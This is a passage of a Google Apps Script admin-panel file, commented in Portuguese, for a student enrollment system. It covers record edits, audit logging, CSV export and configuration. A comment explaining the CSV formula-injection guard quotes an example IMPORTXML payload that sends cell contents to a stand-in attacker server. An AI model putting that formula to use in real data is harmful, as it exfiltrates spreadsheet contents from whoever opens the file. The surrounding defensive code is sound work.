      return 'Matrícula inválida: são de 4 a 20 caracteres, sem contar pontuação.';
    }
  }

  var textos = [
    { chave: 'nome', rotulo: 'nome da inscrição', teto: PAINEL_MAX_NOME },
    { chave: 'nome_oficial', rotulo: 'nome da lista oficial', teto: PAINEL_MAX_NOME },
    { chave: 'turma', rotulo: 'turma', teto: PAINEL_MAX_TURMA }
  ];

  for (var i = 0; i < textos.length; i++) {
    var campo = textos[i];
    if (payload[campo.chave] === undefined) continue;
    if (String(payload[campo.chave]).trim().length > campo.teto) {
      return 'O ' + campo.rotulo + ' passou de ' + campo.teto + ' caracteres.';
    }
  }

  return '';
}

/**
 * O que vai mudar, com o valor de antes e o de depois, campo a campo.
 *
 * Cada campo só pode mudar se a FONTE dele existir, e a recusa diz qual é a fonte
 * — sem isso, o professor edita a turma de um aluno que não está na lista oficial,
 * o painel responde "salvo" e nada acontece.
 *
 * Devolve `{ erro }` para recusar, ou o plano. Nada foi escrito ainda.
 */
function planejarEdicao_(payload, aluno, inscricao, matriculado) {
  var plano = {
    matricula: { de: inscricao ? normalizarMatricula(inscricao.matricula) : '', para: '', mudou: false },
    nome: { de: inscricao ? String(inscricao.nome || '') : '', para: '', mudou: false },
    nomeOficial: { de: matriculado ? String(matriculado.nome || '') : '', para: '', mudou: false },
    turma: { de: matriculado ? String(matriculado.turma || '') : '', para: '', mudou: false },
    projeto: {
      de: { id: inscricao ? String(inscricao.projeto_id || '') : '', nome: inscricao ? String(inscricao.projeto_nome || '') : '' },
      para: null,
      mudou: false
    },
    mudou: false
  };

  plano.matricula.para = plano.matricula.de;
  plano.nome.para = plano.nome.de;
  plano.nomeOficial.para = plano.nomeOficial.de;
  plano.turma.para = plano.turma.de;

  if (payload.matricula !== undefined) {
    var matricula = normalizarMatricula(payload.matricula);
    if (matricula !== plano.matricula.de) {
      if (!inscricao) {
        return { erro: 'Este aluno não tem inscrição: ele veio só da lista oficial, e a matrícula ' +
                       'dele é o endereço da linha da secretaria. Corrija na lista e importe de novo.' };
      }
      // Apagar a matrícula não é corrigir: ela é a chave da pessoa, e sem ela a
      // inscrição passa a ser identificada por e-mail e nome. Quem realmente
      // precisa disso apaga a inscrição e a recebe de novo.
      if (!matricula && plano.matricula.de) {
        return { erro: 'A matrícula não pode ficar em branco — ela é a chave do aluno. ' +
                       'Digite a matrícula correta.' };
      }
      plano.matricula.para = matricula;
      plano.matricula.mudou = true;
    }
  }

  if (payload.nome !== undefined) {
    var nome = formatarNome(payload.nome);
    if (nome !== plano.nome.de) {
      if (!inscricao) return { erro: 'Este aluno não tem inscrição — não há nome digitado para corrigir.' };
      if (!nome) return { erro: 'O nome da inscrição não pode ficar em branco.' };
      plano.nome.para = nome;
      plano.nome.mudou = true;
    }
  }

  if (payload.nome_oficial !== undefined) {
    var oficial = formatarNome(payload.nome_oficial);
    if (oficial !== plano.nomeOficial.de) {
      if (!matriculado) return { erro: 'Este aluno não está na lista oficial importada — não há linha da secretaria para corrigir.' };
      if (!oficial) return { erro: 'O nome da lista oficial não pode ficar em branco.' };
      plano.nomeOficial.para = oficial;
      plano.nomeOficial.mudou = true;
    }
  }

  if (payload.turma !== undefined) {
    // Mesma régua da importação e do cadastro de disciplinas (`normalizarTurma`,
    // 01_Utils.gs). Este é o TERCEIRO caminho que escreve `matriculados.turma`, e
    // deixá-lo fora da régua devolveria o defeito uma ficha por vez: a turma
    // corrigida à mão em caixa baixa some do cruzamento da disciplina, que casa
    // por igualdade.
    //
    // Efeito colateral assumido: numa ficha cuja turma foi gravada em caixa mista
    // por uma importação antiga, salvar QUALQUER campo normaliza a turma junto e
    // registra a mudança no log. É correção, não perda — e ela aparece na trilha
    // com o valor de antes e o de depois, como toda edição daqui.
    var turma = normalizarTurma(payload.turma);
    if (turma !== plano.turma.de) {
      if (!matriculado) {
        return { erro: 'A turma vem da lista oficial da secretaria, e este aluno ainda não está nela. ' +
                       'Ela aparece na ficha quando ele entrar na lista importada.' };
      }
      plano.turma.para = turma;
      plano.turma.mudou = true;
    }
  }

  if (payload.projeto_id !== undefined) {
    var destinoId = String(payload.projeto_id).trim();
    if (destinoId && destinoId !== plano.projeto.de.id) {
      if (!inscricao) {
        return { erro: 'Este aluno não tem inscrição: só quem se inscreveu ocupa vaga em projeto. ' +
                       'Para incluí-lo, use o formulário de cadastro.' };
      }
      var destino = projetoPorId(destinoId);
      if (!destino) return { erro: 'Projeto de destino não encontrado. Recarregue a lista.' };

      plano.projeto.para = { id: destinoId, nome: String(destino.nome || ''), projeto: destino };
      plano.projeto.mudou = true;
    }
  }

  plano.mudou = plano.matricula.mudou || plano.nome.mudou || plano.nomeOficial.mudou ||
                plano.turma.mudou || plano.projeto.mudou;
  return plano;
}

/**
 * Quantas inscrições a vizinhança da matrícula mostra, no máximo.
 *
 * O mesmo teto de `outrosProjetosDe_` (04_Inscricoes.gs), e pelo mesmo motivo: a
 * consulta traz as inscrições de UMA pessoa, que são de uma a seis, mas "na
 * prática" não é teto — uma matrícula digitada errada por muita gente faria a
 * consulta crescer sem limite. Vinte já responde a pergunta com folga.
 */
var PAINEL_MAX_VIZINHAS = 20;

/** Executa o plano. A partir daqui há escrita, e a ordem importa. */
function aplicarEdicao_(id, aluno, inscricao, matriculado, plano) {
  var avisos = [];
  var inscricaoId = aluno.inscricao_id || '';
  var pessoaAntes = inscricao ? chaveDePessoa_(inscricao) : '';
  var pessoaDepois = pessoaAntes;

  // ---- 1. a inscrição, que pode ter de mudar de endereço
  if (inscricao && (plano.matricula.mudou || plano.nome.mudou || plano.projeto.mudou)) {
    var movimento = gravarInscricaoEditada_(inscricao, plano);
    if (!movimento.ok) return movimento;    // nada foi escrito

    inscricaoId = movimento.id;
    pessoaDepois = movimento.pessoa;
  }

  // ---- 1b. a vizinhança da matrícula, DEPOIS da escrita
  //
  // Depois, e a ordem é a coisa mais importante deste bloco: quem impede duas
  // inscrições da mesma pessoa no mesmo projeto continua sendo o 409 do banco, e
  // uma consulta ANTES da escrita seria exatamente a conferência otimista que
  // este sistema tirou do caminho (ver `gravarInscricao`, 04_Inscricoes.gs). Há
  // teste que conta as requisições e falha se aparecer consulta antes.
  //
  // Depois também é mais simples: a inscrição aberta já saiu do endereço velho,
  // então o que a consulta da matrícula ANTIGA devolve é, sem filtrar nada,
  // exatamente o que ficou para trás.
  var vizinhas = (inscricao && plano.matricula.mudou)
    ? vizinhasDaMatricula_(plano.matricula.de, plano.matricula.para, inscricaoId)
    : null;

  if (vizinhas) avisarVizinhanca_(vizinhas, plano, avisos);

  // ---- 2. a linha da secretaria
  if (plano.nomeOficial.mudou || plano.turma.mudou) {
    var oficial = { atualizado_em: agora() };
    if (plano.nomeOficial.mudou) oficial.nome = plano.nomeOficial.para;
    if (plano.turma.mudou) oficial.turma = plano.turma.para;

    // `atualizar` é PATCH, e PATCH no Firestore CRIA o documento que não existe.
    // Quem garante que ele existe é a leitura lá de cima — a mesma guarda que
    // `salvarProjeto` e `resolverAluno` tomam antes de gravar.
    atualizar(MATRICULADOS_COLECAO, matriculado._id, oficial);

    avisos.push('A lista oficial foi corrigida aqui. A próxima importação da lista da secretaria ' +
                'sobrescreve esta linha pela matrícula — se o arquivo dela ainda tiver o dado antigo, ' +
                'ele volta.');
  }

  // ---- 3. o cadastro: recalculado pela reconciliação, ou projetado à mão
  var idFinal = id;
  var reconciliacao = null;

  if (pessoaDepois !== pessoaAntes) {
    idFinal = chaveAluno_(pessoaDepois || ('ins:' + inscricaoId));
    reconciliacao = reconciliarDepoisDaEdicao_();
    if (reconciliacao.erro) {
      avisos.push('A correção foi gravada, mas o cruzamento que refaz a ficha falhou: ' +
                  reconciliacao.erro + ' Clique em Atualizar na aba Alunos.');
    }
  } else {
    projetarNoAluno_(id, aluno, inscricao, matriculado, plano, inscricaoId);
  }

  // A ocupação do destino é contada UMA vez, depois da escrita, e serve às duas
  // pontas: a linha do histórico e a frase que a coordenação lê. Contar duas
  // vezes abriria a chance de o log dizer 61 e a tela dizer 62.
  var destino = null;
  if (plano.projeto.mudou) {
    destino = {
      id: plano.projeto.para.id,
      nome: plano.projeto.para.nome,
      vagas: Number(plano.projeto.para.projeto.vagas || 0),
      inscritos: contarInscritos_(plano.projeto.para.id)
    };
  }

  // O log aponta para a ficha FINAL, não para a que estava aberta na tela. Numa
  // correção de matrícula o endereço velho costuma ser reaproveitado pela pessoa
  // dona daquela matrícula — registrar `id` faria a trilha da correção da Ana
  // apontar para a ficha do Bruno, que é o contrário do que a auditoria serve.
  registrarEdicao_(idFinal, plano, destino, vizinhas);

  var mensagem = destino ? avisarMigracao_(destino, avisos) : 'Ficha atualizada.';

  // Nome, turma e matrícula mudam os números por status e o histograma de cursos
  // da aba Painel — os mesmos dez números que `resolverAluno` já invalida.
  invalidarCachePainel_();

  return { ok: true, id: idFinal, mensagem: mensagem, avisos: avisos, reconciliou: Boolean(reconciliacao) };
}

/**
 * As outras inscrições que a matrícula velha e a matrícula nova alcançam.
 *
 * Devolve { ficam, jaUsam }, cada uma uma lista de { projeto, nome }. Duas
 * consultas de um `fieldFilter` sobre `matricula`, sem ordenação declarada — a
 * mesma forma que `outrosProjetosDe_` (04_Inscricoes.gs) já usa em produção, então
 * não pede índice composto nenhum.
 *
 * Nunca lança: esta é uma pergunta de CONFERÊNCIA, e derrubar por causa dela uma
 * correção que já foi decidida seria trocar um aviso que falta por um erro que não
 * ajuda. Falhando, devolve vazio e a edição segue como seguia antes.
 */
function vizinhasDaMatricula_(antiga, nova, idRecemGravado) {
  var vazio = { ficam: [], jaUsam: [], falhou: false };
  if (!antiga || !nova) return vazio;

  try {
    var ficam = listar(INSCRICOES_COLECAO, {
      campo: 'matricula', valor: antiga, limite: PAINEL_MAX_VIZINHAS
    }).itens;

    var jaUsam = listar(INSCRICOES_COLECAO, {
      campo: 'matricula', valor: nova, limite: PAINEL_MAX_VIZINHAS
    }).itens.filter(function (i) {
      // A inscrição que acabou de ser gravada carrega a matrícula nova por
      // definição. Sem esta linha, toda correção se acusaria de fundir a pessoa
      // com ela mesma.
      return String(i._id) !== String(idRecemGravado);
    });

    return { ficam: ficam.map(resumoDaInscricao_), jaUsam: jaUsam.map(resumoDaInscricao_), falhou: false };
  } catch (err) {
    console.error('vizinhasDaMatricula_: ' + err.message);
    return { ficam: [], jaUsam: [], falhou: true };
  }
}

function resumoDaInscricao_(i) {
  return {
    projeto: String(i.projeto_nome || i.projeto_id || 'sem projeto'),
    nome: String(i.nome || '')
  };
}

/**
 * Põe em palavras o que a vizinhança da matrícula significa para quem clicou.
 *
 * Os dois avisos falam de coisas diferentes e por isso são dois. O primeiro diz
 * que a correção ficou PELA METADE — e nomeia os projetos, que é por onde a
 * coordenação termina o serviço. O segundo diz que duas fichas vão VIRAR UMA, e
 * traz o nome que estava do outro lado: é ele que responde, na hora, se foi erro
 * de digitação ou se é a mesma pessoa.
 */
function avisarVizinhanca_(vizinhas, plano, avisos) {
  if (vizinhas.falhou) {
    avisos.push('Não consegui conferir se esta matrícula aparece em outras inscrições — a consulta ' +
                'falhou. A correção foi gravada; confira a aba Alunos depois do próximo cruzamento.');
    return;
  }

  if (vizinhas.ficam.length) {
    avisos.push('ATENÇÃO: a matrícula ' + plano.matricula.de + ' continua em ' +
      vizinhas.ficam.length + ' outra(s) inscrição(ões) desta pessoa — ' +
      vizinhas.ficam.map(function (i) { return '"' + i.projeto + '"'; }).join(', ') +
      '. Corrigi só a inscrição que estava aberta. Enquanto as outras não forem corrigidas, ' +
      'o cruzamento vai manter duas fichas: uma com a matrícula nova e outra com a antiga.');
  }

  if (vizinhas.jaUsam.length) {
    var nomes = [];
    vizinhas.jaUsam.forEach(function (i) {
      if (i.nome && nomes.indexOf(i.nome) === -1) nomes.push(i.nome);
    });
    avisos.push('ATENÇÃO: a matrícula ' + plano.matricula.para + ' já estava em ' +
      vizinhas.jaUsam.length + ' inscrição(ões) — ' +
      vizinhas.jaUsam.map(function (i) { return '"' + i.projeto + '"'; }).join(', ') +
      (nomes.length ? ', em nome de ' + nomes.join(' / ') : '') +
      '. O cruzamento junta tudo numa ficha só, com os projetos somados. Se não for a mesma ' +
      'pessoa, desfaça corrigindo a matrícula de volta.');
  }
}

/**
 * Grava a inscrição corrigida, movendo-a de endereço quando a chave muda.
 *
 * A decisão de mover NÃO olha "mudou a matrícula?": ela compara a chave de dedup
 * calculada com o id atual do documento. É a única forma correta, porque
 * `chaveDedup_` cai para CPF e depois para e-mail+nome quando não há matrícula —
 * então até uma correção de NOME muda o endereço de uma inscrição sem matrícula.
 * Perguntar "que campo mudou?" acertaria o caso comum e erraria esse.
 */
function gravarInscricaoEditada_(inscricao, plano) {
  var novo = Object.assign({}, inscricao);
  novo.matricula = plano.matricula.para;
  novo.nome = plano.nome.para;

  if (plano.projeto.mudou) {
    novo.projeto_id = plano.projeto.para.id;
    novo.projeto_nome = plano.projeto.para.nome;
  }

  // A conferência contra a lista oficial é do NÚMERO, então ela precisa ser
  // refeita: sem isto, a inscrição corrigida continuaria com o visto verde que
  // ganhou pela matrícula de outra pessoa. Uma leitura de ponto.
  if (plano.matricula.mudou) {
    novo.matricula_conferida = matriculaConhecida(plano.matricula.para) ? 'SIM' : 'NAO';
  }

  var velha = String(inscricao._id);
  var nova = chaveDedup_(novo);

  if (nova === velha) {
    // Só os campos que mudaram entram na máscara. Mandar o registro inteiro
    // gravaria '' em cima de tudo que viesse `undefined` (`fsValor_`, 02_Repo.gs
    // converte ausente em texto vazio) — e é assim que uma correção de nome
    // apagaria o consentimento e o `raw_json` da inscrição, calada.
    var remendo = {};
    if (plano.matricula.mudou) {
      remendo.matricula = novo.matricula;
      remendo.matricula_conferida = novo.matricula_conferida;
    }
    if (plano.nome.mudou) remendo.nome = novo.nome;
    if (plano.projeto.mudou) {
      remendo.projeto_id = novo.projeto_id;
      remendo.projeto_nome = novo.projeto_nome;
    }

    atualizar(INSCRICOES_COLECAO, velha, remendo);
    return { ok: true, id: velha, pessoa: chaveDePessoa_(novo) };
  }

  var gravacao = inserir(INSCRICOES_COLECAO, novo, nova);
  if (gravacao.jaExistia) {
    return {
      ok: false,
      erro: 'Não mudei nada: já existe uma inscrição desta pessoa neste projeto. ' +
            (plano.projeto.mudou
              ? 'Ela já está em "' + plano.projeto.para.nome + '".'
              : 'A matrícula ' + plano.matricula.para + ' já tem inscrição neste projeto — ' +
                'confira se não são duas fichas da mesma pessoa.')
    };
  }

  excluir(INSCRICOES_COLECAO, velha);
  return { ok: true, id: nova, pessoa: chaveDePessoa_(novo) };
}

/**
 * Atualiza a linha do cadastro sem reconciliar, com a precedência de `montarAluno_`.
 *
 * Cada campo aqui é uma cópia declarada de uma linha de `montarAluno_`
 * (06_Reconciliacao.gs), e a cópia é deliberada: chamar `montarAluno_` de fora
 * reconstruiria o documento INTEIRO a partir de UMA inscrição, e quem está em dois
 * projetos perderia o segundo nome do campo `projeto` — a rodada junta as
 * inscrições da mesma pessoa, esta função não tem como saber delas sem uma
 * consulta a mais.
 *
 * O preço da cópia é a chance de as duas divergirem, e por isso existe teste que
 * compara campo a campo o que sai daqui com o que `montarAluno_` produz.
 */
function projetarNoAluno_(id, aluno, inscricao, matriculado, plano, inscricaoId) {
  var projecao = {};

  // A lista oficial manda no nome — é a regra de `montarAluno_`. Então corrigir o
  // nome DIGITADO não muda a linha do cadastro de quem casou com a secretaria, e
  // a janela de edição diz isso ao lado do campo. Aqui, o que importa é não
  // gravar um nome que a próxima reconciliação desfaria.
  if (plano.nome.mudou || plano.nomeOficial.mudou) {
    var nomeOficial = plano.nomeOficial.mudou ? plano.nomeOficial.para : (matriculado ? matriculado.nome : '');
    projecao.nome = formatarNome(nomeOficial || plano.nome.para);
  }

  if (plano.turma.mudou) projecao.turma = plano.turma.para;

  if (plano.projeto.mudou) {
    projecao.projeto = trocarProjetoNoTexto_(aluno.projeto, plano.projeto.de.nome, plano.projeto.para.nome);
  }

  // A inscrição mudou de endereço: sem esta linha, `detalheAluno` iria buscar um
  // documento que não existe mais e a ficha diria "sem registro correspondente"
  // até a próxima reconciliação.
  if (inscricao && inscricaoId !== String(inscricao._id)) projecao.inscricao_id = inscricaoId;

  if (!Object.keys(projecao).length) return;

  projecao.atualizado_em = agora();
  atualizar(ALUNOS_COLECAO, id, projecao);
}

/**
 * Troca o nome de um projeto dentro do campo `projeto` do cadastro.
 *
 * O campo é a JUNÇÃO dos projetos da pessoa, separada por ' | '
 * (`juntarProjetos_`, 06_Reconciliacao.gs) — quem está em dois projetos tem os
 * dois ali. Trocar só o pedaço certo, na posição em que ele estava, é o que
 * mantém a ordem que a reconciliação produziria; remontar a lista de outro jeito
 * faria a rodada seguinte reescrever a linha à toa.
 */
function trocarProjetoNoTexto_(texto, antigo, novo) {
  var lista = String(texto || '').split(' | ').filter(function (p) { return p !== ''; });
  var trocou = false;

  var saida = lista.map(function (p) {
    if (!trocou && p === antigo) { trocou = true; return novo; }
    return p;
  }).filter(function (p, i, todos) { return todos.indexOf(p) === i; });

  if (!trocou && novo) saida.push(novo);
  return saida.join(' | ');
}

/**
 * A reconciliação que segue uma correção de chave. Nunca lança.
 *
 * Ela NÃO passa pelo freio do botão Atualizar, e é de propósito: o freio existe
 * para o clique de reflexo, e isto aqui é a segunda metade de uma correção que já
 * escreveu no banco. Parar no meio deixaria o cadastro apontando para uma
 * inscrição que mudou de endereço. O custo entra na conta do dia do mesmo jeito.
 */
function reconciliarDepoisDaEdicao_() {
  try {
    var resumo = reconciliar();
    marcarReconciliacao_(marcaDaReconciliacao_());
    return { resumo: resumo, erro: '' };
  } catch (err) {
    console.error('editarAluno (reconciliação): ' + err.message);
    return { resumo: null, erro: err.message };
  }
}

/**
 * A trilha da edição.
 *
 * Guarda os VALORES da matrícula e dos projetos, e só o NOME DOS CAMPOS para nome
 * e turma. A diferença não é acaso: matrícula e projeto são o que alguém vai
 * querer desfazer ou explicar seis meses depois ("por que este projeto tem 61
 * inscritos?"), e sem o antes e o depois a linha do log não serve para nada. Nome
 * completo é dado pessoal que já está na ficha, a um clique — repeti-lo na
 * auditoria seria espalhá-lo sem ganhar nada.
 */
function registrarEdicao_(id, plano, destino, vizinhas) {
  var partes = [];
  if (plano.matricula.mudou) {
    partes.push('matrícula ' + (plano.matricula.de || '(vazia)') + ' -> ' + plano.matricula.para);

    // Os NÚMEROS da vizinhança entram na trilha; os nomes, não. Quem for
    // reconstituir "por que esta ficha tem dois projetos" precisa saber que a
    // correção deixou inscrição para trás ou encontrou a matrícula já ocupada —
    // e isso é uma contagem. O nome de quem estava do outro lado já está na
    // ficha, a um clique, e repeti-lo aqui seria espalhá-lo sem ganhar nada.
    if (vizinhas && vizinhas.ficam.length) {
      partes.push(vizinhas.ficam.length + ' inscrição(ões) FICARAM com a matrícula antiga');
    }
    if (vizinhas && vizinhas.jaUsam.length) {
      partes.push('a matrícula nova já estava em ' + vizinhas.jaUsam.length + ' inscrição(ões) — fichas fundidas');
    }
  }
  if (plano.nome.mudou) partes.push('nome da inscrição alterado');
  if (plano.nomeOficial.mudou) partes.push('nome da lista oficial alterado');
  if (plano.turma.mudou) partes.push('turma ' + (plano.turma.de || '(vazia)') + ' -> ' + plano.turma.para);

  if (partes.length) registrar('ALUNO_EDITADO', 'aluno', id, partes.join('; '));

  if (!destino) return;

  // Linha própria, e não um pedaço da anterior: é ela que responde "por que este
  // projeto tem 61 inscritos", e ela precisa carregar de onde saiu, para onde foi
  // e quanto ficou. Quem fez vem de `registrar`, que grava `usuarioAtual()`.
  registrar('ALUNO_MIGRADO', 'aluno', id,
    'de "' + (plano.projeto.de.nome || plano.projeto.de.id || 'sem projeto') + '" para "' +
    destino.nome + '" (' + destino.id + '); o destino ficou com ' + destino.inscritos +
    (destino.vagas > 0 ? ' de ' + destino.vagas + ' vagas' : ' inscritos (vagas ilimitadas)') +
    (destino.vagas > 0 && destino.inscritos > destino.vagas ? ' — ACIMA DO TETO' : ''));
}

/**
 * A frase que a coordenação lê depois de migrar — com o número verdadeiro.
 *
 * "61 de 60" é dito em voz alta, e não arredondado para 60: quem estourou o teto
 * precisa VER que estourou, no instante em que estourou. O aluno continua vendo o
 * projeto como ESGOTADO e continua sendo barrado no formulário (`situacaoDe_`,
 * 09_Projetos.gs) — quem ganha a exceção é a coordenação, não o público.
 */
function avisarMigracao_(destino, avisos) {
  if (destino.vagas > 0 && destino.inscritos > destino.vagas) {
    avisos.push('O projeto "' + destino.nome + '" passou do teto: ' + destino.inscritos +
                ' inscritos para ' + destino.vagas + ' vagas. O formulário continua recusando ' +
                'alunos por conta própria — a exceção foi só desta migração, e ela está no histórico.');
  }

  return 'Aluno migrado para "' + destino.nome + '". O projeto ficou com ' + destino.inscritos +
         (destino.vagas > 0 ? ' de ' + destino.vagas + ' vagas.' : ' inscritos.');
}

/**
 * Gera o CSV da lista filtrada. O download é montado no navegador.
 *
 * Leitura cheia de propósito: exportar 3.000 alunos custa 3.000 leituras e não há
 * desenho que evite isso — o arquivo tem uma linha por aluno. O que existe é o
 * teto de PAINEL_TETO_EXPORTACAO, para um clique repetido não conseguir queimar a
 * cota do dia; passando dele, o arquivo sai truncado e o aviso vai para o log.
 */
function exportarCsv(payload) {
  try {
    exigirAdmin(payload && payload.token);
    payload = payload || {};

    var pedido = pedidoDeAlunos_(payload);
    var varrido = colherAlunos_(pedido, PAINEL_TETO_EXPORTACAO);

    var colunas = ['nome', 'cpf', 'email', 'telefone', 'data_nascimento',
      'matricula', 'curso', 'turma', 'situacao', 'statusLabel', 'metodo_match', 'observacoes'];
    var titulos = ['Nome', 'CPF', 'E-mail', 'Telefone', 'Nascimento',
      'Matrícula', 'Curso', 'Turma', 'Situação', 'Status', 'Método do match', 'Observações'];

    var linhas = [titulos];
    varrido.itens.forEach(function (a) {
      var tela = formatarAlunoParaTela_(a);
      linhas.push(colunas.map(function (c) {
        return String(tela[c] === undefined || tela[c] === null ? '' : tela[c]);
      }));
    });

    // Ponto e vírgula + BOM: é assim que o Excel em pt-BR abre sem embaralhar.
    var csv = linhas.map(function (l) {
      return l.map(function (c) {
        return '"' + protegerFormulaCsv_(c).replace(/"/g, '""') + '"';
      }).join(';');
    }).join('\r\n');

    registrar('EXPORTACAO', 'alunos', '',
      (linhas.length - 1) + ' linhas' + (varrido.truncado ? ' (TRUNCADO no teto de ' + PAINEL_TETO_EXPORTACAO + ')' : ''));

    return { ok: true, csv: '﻿' + csv, linhas: linhas.length - 1 };
  } catch (err) {
    return { ok: false, erro: err.message };
  }
}

/**
 * Impede que uma célula do CSV seja avaliada como fórmula ao abrir.
 *
 * O aluno digita o próprio nome, e nada impede que ele digite
 * `=IMPORTXML("http://servidor-dele?d="&A1;"//x")`. Se isso virar fórmula viva na
 * planilha, ela roda com os privilégios de quem abriu o arquivo e manda o
 * conteúdo das células para fora. É a via de exfiltração clássica de planilha, e
 * não depende de o atacante ter acesso a nada. Aspas não bastam: o Excel avalia
 * `"=1+1"` do mesmo jeito. A aspa simples inicial marca "isto é texto", some na
 * leitura e impede a avaliação.
 *
 * Vale para = + - @ e para tabulação e retorno de carro, que o Excel também trata
 * como início de fórmula.
 *
 * POR QUE COM OUTRO NOME: no sistema sobre Sheets esta defesa é
 * `protegerContraFormula_` e mora em 02_Repo.gs, porque lá ela protege TODA
 * escrita na planilha, não só a exportação. No projeto novo o Repo é o cliente do
 * Firestore e não tem — nem precisa ter — essa função: Firestore não avalia
 * fórmula. O único vetor que sobrou é o CSV que sai daqui, então a defesa mora
 * aqui, com nome que diz onde ela vale. Ver o relatório desta fase.
 */
function protegerFormulaCsv_(v) {
  var texto = String(v === null || v === undefined ? '' : v);
  if (!texto) return texto;
  return /^[=+\-@\t\r]/.test(texto) ? "'" + texto : texto;
}

// ------------------------------------------------------------ Lotes e log

/**
 * As últimas importações.
 *
 * `lerTudo(LOTES).reverse().slice(0, 50)` no sistema sobre Sheets vira ordenação
 * e limite no banco. Ordena por CAMPO, nunca por `__name__` DESCENDENTE: o índice
 * automático de `__name__` só cobre ascendente, e pedir o contrário devolve 400
 * "The query requires an index" (a armadilha que `ultimosRegistros` em 04_Log.gs
 * pagou).
 *
 * O campo é `criado_em`, e a escolha é do outro lado: `registrarLote_`
 * (05_Importacao.gs) grava nele o carimbo UTC de largura fixa que também abre o
 * id do lote, exatamente como o log faz, e diz no comentário que é por ele que se
 * ordena. `importado_em` existe no mesmo documento, mas é a hora LOCAL legível,
 * para a tela mostrar.
 *
 * A rede de segurança embaixo existe porque no Firestore documento SEM o campo da
 * ordenação é EXCLUÍDO do resultado — não é erro, é lista vazia. Se um lote
 * entrar por outro caminho, sem `criado_em`, a aba ficaria eternamente vazia sem
 * nenhum sinal, que é o modo de falha mais caro de encontrar. Uma segunda
 * consulta sem ordenação distingue "não há lotes" de "há, e não sei ordenar".
 * Os nomes dos campos que a tela lê são ditados pelo `Admin.html` (1322-1330).
 */
function listarLotes(payload) {
  try {
    exigirAdmin(payload && payload.token);

    var itens = listar(LOTES_COLECAO, {
      ordenarPor: 'criado_em', direcao: 'DESC', limite: PAINEL_LIMITE_LOTES
    }).itens;

    if (!itens.length) {
      itens = listar(LOTES_COLECAO, { limite: PAINEL_LIMITE_LOTES }).itens;
    }

    return {
      ok: true,
      itens: itens.map(function (l) {
        return {
          lote_id: l.lote_id || l._id,
          arquivo: l.arquivo,
          tipo: l.tipo,
          linhas: l.linhas,
          importado_em: l.importado_em,
          importado_por: l.importado_por,
          status: l.status
        };
      })
    };
  } catch (err) {
    return { ok: false, erro: err.message };
  }
}

/**
 * Os últimos registros da trilha de auditoria.
 *
 * `ultimosRegistros` (04_Log.gs) já faz a pergunta certa ao banco — ordenação por
 * `criado_em` DESC com teto. Reimplementar aqui só criaria um segundo lugar onde
 * a armadilha do `__name__` poderia voltar.
 */
function listarLog(payload) {
  try {
    exigirAdmin(payload && payload.token);

    return {
      ok: true,
      itens: ultimosRegistros(PAINEL_LIMITE_LOG).map(function (l) {
        return {
          timestamp: l.timestamp,
          usuario: l.usuario,
          acao: l.acao,
          entidade: l.entidade,
          entidade_id: l.entidade_id,
          // O detalhe é texto livre de quem registrou; a tela mostra um resumo.
          detalhe: String(l.detalhe || '').slice(0, 200)
        };
      })
    };
  } catch (err) {
    return { ok: false, erro: err.message };
  }
}

// ------------------------------------------------------------ Configurações

/**
 * Os parâmetros editáveis, na ordem de CONFIG_PADRAO.
 *
 * Uma leitura: a configuração inteira é UM documento (ver 03_Config.gs), e nesta
 * altura ele já pode estar em cache da execução.
 *
 * As descrições vêm de CONFIG_PADRAO (00_Config.gs) e não do banco, porque
 * `semearConfigPadrao_` deliberadamente não as grava: documentação de chave vive
 * no código, e copiá-la para o banco engordaria o documento que o formulário
 * público lê a cada visita.
 *
 * Chaves que existem no banco e não em CONFIG_PADRAO entram no fim, sem
 * descrição — do contrário uma chave criada à mão sumiria da tela e viraria
 * configuração invisível.
 */
function lerConfiguracoes(payload) {
  try {
    exigirAdmin(payload && payload.token);

    var atual = lerConfig();
    var itens = [];
    var vistas = {};

    CONFIG_PADRAO.forEach(function (padrao) {
      vistas[padrao.chave] = true;

      // Nenhuma chave de configuração é segredo desde que o PIN saiu do sistema
      // (07b_LinkPorEmail.gs). O mecanismo de CONFIG_SEGREDOS continua em
      // 03_Config.gs, com o mapa vazio, para o dia em que voltar a haver um: sem
      // esta conferência, o valor de um segredo futuro viajaria para o navegador
      // no primeiro deploy que o criasse.
      if (configSegredo_(padrao.chave)) return;

      itens.push({
        chave: padrao.chave,
        valor: atual[padrao.chave] === undefined ? '' : atual[padrao.chave],
        descricao: padrao.descricao
      });
    });

    Object.keys(atual).sort().forEach(function (chave) {
      if (vistas[chave]) return;
      itens.push({ chave: chave, valor: atual[chave], descricao: '' });
    });

    return { ok: true, itens: itens, urlWebApp: urlDoWebApp_() };
  } catch (err) {
    return { ok: false, erro: err.message };
  }
}

/**
 * Endereço público desta implantação, para a coordenação copiar.
 *
 * Existe aqui, e com nome próprio, porque o projeto novo não tem o `urlWebApp()`
 * que o sistema sobre Sheets guarda em 03_Setup.gs (arquivo que nem foi trazido —
 * ele existia para criar abas e menus de planilha). Devolve '' fora de uma
 * implantação publicada, e o `Admin.html` simplesmente esconde o cartão.
 */
function urlDoWebApp_() {
  try {
    return ScriptApp.getService().getUrl() || '';
  } catch (e) {
    return '';
  }
}

/**
 * Grava um parâmetro.
 *
 * Quatro guardas, e as quatro existem para impedir a mesma coisa: o painel se
 * trancar por fora.
 *
 *   1. chave desconhecida é recusada. A tela só oferece as que existem, então uma
 *      chave nova aqui é erro de digitação — e uma chave errada não avisa: ela
 *      grava, o sistema continua lendo o padrão, e a coordenação jura que mudou;
 *   2. `admin_emails` é a lista de quem entra, e não um texto: ela vai para
 *      `regravarAllowlist_` (07_Auth.gs), que é quem recusa esvaziar a lista,
 *      derruba a sessão de quem saiu e registra na trilha. Gravar por aqui era a
 *      porta dos fundos das guardas de `removerAdmin`;
 *   3. chave marcada como segredo em CONFIG_SEGREDOS não passa por aqui. O mapa
 *      está vazio hoje — a guarda fica pelo dia em que não estiver.
 *
 * A guarda que existia para `modo_acesso_painel` foi embora com a chave: não há
 * mais modo de acesso a configurar, porque as duas portas remotas coexistem
 * sempre (ver o topo de 07_Auth.gs).
 *
 * O log guarda a chave, nunca o valor: por aqui passam os textos de
 * consentimento, e trilha de auditoria não é lugar de dado de tela.
 */
function salvarConfiguracao(payload) {
  try {
    exigirAdmin(payload && payload.token);
    payload = payload || {};

    var chave = String(payload.chave || '').trim();
    if (!chave) return { ok: false, erro: 'Informe a chave.' };

    var valor = payload.valor === undefined || payload.valor === null ? '' : String(payload.valor);

    if (configSegredo_(chave)) {
      return { ok: false, erro: 'Esta chave é secreta e não se edita pela tela.' };
    }

